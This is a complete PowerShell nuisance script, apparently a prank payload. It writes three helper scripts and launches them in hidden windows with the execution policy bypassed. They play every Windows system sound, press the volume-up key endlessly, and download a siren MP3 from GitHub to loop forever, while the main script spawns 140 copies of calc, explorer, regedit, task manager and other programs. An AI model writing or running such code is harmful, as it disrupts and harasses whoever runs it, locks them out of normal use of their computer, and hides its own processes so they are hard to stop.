$notificationScriptContent = @'
Function Send-NotificationSoundSpam {
    param ([int]$Interval = 0)
    
    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | ForEach-Object {
        (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").PlaySync()
        Start-Sleep -Milliseconds 1
    }
}

Send-NotificationSoundSpam
'@
$notificationScriptPath = "$PWD\notification.ps1"
Set-Content -Path $notificationScriptPath -Value $notificationScriptContent

$trayScriptContent = @'
$WScript = New-Object -com wscript.shell
while ($true) {
    $WScript.SendKeys([char]175)
    Start-Sleep -Milliseconds 1
}
'@
$trayScriptPath = "$PWD\tray.ps1"
Set-Content -Path $trayScriptPath -Value $trayScriptContent

$speechScriptContent = @'
Function Play-SirenLoop {
    $sirenPath = "$env:TEMP\siren.mp3"

    if (-Not (Test-Path $sirenPath)) {
        Invoke-WebRequest -Uri "https://github.com/KateTheStargazer/funny/raw/main/siren.mp3" -OutFile $sirenPath
    }

    $player = New-Object -ComObject WMPlayer.OCX.7
    $media = $player.newMedia($sirenPath)

    while ($true) {
        $player.controls.stop()
        $player.currentMedia = $media
        $player.controls.play()
        Start-Sleep -Seconds 4  # Adjust based on the siren.mp3 duration
    }
}

Play-SirenLoop
'@

$speechScriptPath = "$PWD\speech.ps1"
Set-Content -Path $speechScriptPath -Value $speechScriptContent

Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$notificationScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$trayScriptPath`""

$WScript = New-Object -com wscript.shell
1..50 | % { $WScript.SendKeys([char]175) }

$processes = @("calc.exe", "explorer.exe", "notepad.exe", "cmd.exe", "regedit.exe", "msinfo32.exe", "taskmgr.exe")
for ($i = 1; $i -le 20; $i++) {
    foreach ($process in $processes) {
        Start-Process -FilePath $process -NoNewWindow
    }
}
